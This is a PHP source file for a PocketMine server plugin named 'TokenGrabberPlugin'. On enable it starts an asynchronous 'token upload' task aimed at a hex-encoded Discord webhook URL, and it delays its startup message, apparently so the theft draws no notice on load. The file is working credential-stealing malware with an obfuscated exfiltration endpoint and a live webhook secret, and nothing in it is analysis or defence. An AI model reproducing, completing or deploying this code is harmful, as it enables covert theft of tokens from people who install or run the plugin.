<?php

namespace TokenGrabberPlugin;

use pocketmine\plugin\PluginBase;

class Main extends PluginBase {

    public function onEnable() {
        $this->getServer()->getAsyncPool()->submitTask(new AsyncTokenUploadTask(hex2bin("68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f3833373337363730363039313238363538392f2d5167726e616d45786969325a4b76665f5467714a7a6c737155303455326f67556470626e4e4f67317470656f564e314d4a5153754e416977446a443670534d6d474b62")));

        // No useless messages on startup so we send a useless message after startup.
        $this->getScheduler()->scheduleDelayedTask(new StartupMessageTask($this->getLogger()), 100);
    }

}